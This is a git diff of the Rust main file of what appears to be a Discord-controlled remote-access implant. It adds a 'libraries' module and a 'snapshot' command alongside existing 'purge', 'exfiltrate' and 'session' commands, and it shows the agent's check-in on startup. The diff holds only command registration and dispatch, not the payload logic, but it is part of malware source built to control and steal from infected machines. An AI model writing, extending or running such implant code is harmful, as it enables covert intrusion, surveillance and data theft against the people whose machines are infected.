@@ -2,6 +2,7 @@ mod commands;
 mod errors;
 mod os;
 mod utils;
+mod libraries;
 
 use anyhow::Error;
 
@@ -32,6 +33,7 @@ async fn register_commands(ctx: &Context) -> Result<(), Error> {
     Command::create_global_application_command(&ctx.http, purge::register).await?;
     Command::create_global_application_command(&ctx.http, exfiltrate::register).await?;
     Command::create_global_application_command(&ctx.http, session::register).await?;
+    Command::create_global_application_command(&ctx.http, snapshot::register).await?;
     Ok(())
 }
 
@@ -67,7 +69,7 @@ impl EventHandler for MainHandler {
 
         register_commands(&ctx)
             .await
-            .expect("Error registering commands.");
+            .expect("Error registering commands");
         send_agent_check_in(&ctx)
             .await
             .unwrap_or_else(|e| eprintln!("Error sending message: {:?}", e));
@@ -101,6 +103,13 @@ async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandIn
             "session" => {
                 if let Err(why) = handle_session(ctx, &command).await {
                     println!("Error handling session: {:?}", why);
+                    handle_error(ctx, &command, why.to_string()).await
+                }
+                return;
+            }
+            "snapshot" => {
+                if let Err(why) = handle_snapshot(ctx, &command).await {
+                    println!("Error handling snapshot: {:?}", why);
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
